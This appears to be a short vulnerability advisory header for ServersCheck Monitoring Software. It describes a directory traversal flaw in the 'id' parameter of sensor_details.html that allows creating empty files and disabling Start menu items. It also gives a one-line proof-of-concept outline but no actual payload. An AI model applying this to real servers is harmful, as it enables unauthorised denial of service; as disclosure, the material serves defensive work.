# https://serverscheck.com/monitoring-software/release.asp
# Affected Component: "sensor_details.html" webpage the "id" parameter

# Security Issue
# ServersCheck Monitoring Software allows remote attackers to cause a denial of service
# (menu functionality loss) by creating an LNK file that points to a second LNK file, if this
# second LNK file is associated with a Start menu item. Ultimately, this behavior comes
# from a Directory Traversal bug (via the sensor_details.html id parameter) that allows
# creating empty files in arbitrary directories.

# Exploit/POC
# DOS Command Prompt .LNK under Start Menu change <VICTIM> to desired user.
